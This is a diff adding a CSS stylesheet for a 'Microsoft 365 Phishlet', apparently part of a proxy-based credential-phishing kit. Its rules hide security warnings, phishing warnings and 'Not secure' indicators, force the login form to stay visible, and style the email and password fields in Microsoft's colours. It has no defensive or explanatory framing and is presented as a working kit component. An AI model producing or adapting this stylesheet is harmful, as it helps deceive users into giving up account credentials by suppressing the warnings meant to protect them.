@@ -1,0 +1,106 @@
+/**
+ * Custom CSS for Microsoft 365 Phishlet
+ * 
+ * This stylesheet can be used to customize the appearance of the phishing page
+ * or fix rendering issues that may arise from proxying.
+ * 
+ * Author: billion_laughs
+ * Version: 1.0.0
+ */
+
+/* Hide any security warnings or notices */
+.security-warning,
+.phishing-warning,
+[data-warning="true"] {
+  display: none !important;
+}
+
+/* Ensure login form is always visible */
+#loginForm,
+.login-container,
+[data-testid="login-form"] {
+  display: block !important;
+  visibility: visible !important;
+  opacity: 1 !important;
+}
+
+/* Fix any z-index issues */
+.modal-overlay,
+.popup-overlay {
+  z-index: 9999 !important;
+}
+
+/* Smooth transitions for better UX */
+input[type="text"],
+input[type="password"],
+input[type="email"] {
+  transition: border-color 0.3s ease, box-shadow 0.3s ease;
+}
+
+input[type="text"]:focus,
+input[type="password"]:focus,
+input[type="email"]:focus {
+  border-color: #0078d4;
+  box-shadow: 0 0 0 2px rgba(0, 120, 212, 0.2);
+  outline: none;
+}
+
+/* Hide any "Not secure" indicators */
+[data-secure="false"],
+.insecure-warning {
+  display: none !important;
+}
+
+/* Ensure buttons are clickable */
+button,
+input[type="submit"],
+.submit-button {
+  cursor: pointer !important;
+  pointer-events: auto !important;
+}
+
+/* Fix any layout issues */
+.login-page-container {
+  min-height: 100vh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+/* Custom loading indicator (optional) */
+.custom-loader {
+  border: 4px solid #f3f3f3;
+  border-top: 4px solid #0078d4;
+  border-radius: 50%;
+  width: 40px;
+  height: 40px;
+  animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+
+/* Hide Microsoft branding if needed (use carefully) */
+/* 
+.microsoft-logo,
+[data-brand="microsoft"] {
+  display: none !important;
+}
+*/
+
+/* Responsive fixes */
+@media (max-width: 768px) {
+  .login-container {
+    padding: 20px;
+    width: 100%;
+  }
+}
+
+/* Debug mode - uncomment to highlight all interactive elements */
+/*
+input, button, a, select, textarea {
+  outline: 2px solid red !important;
+}
+*/
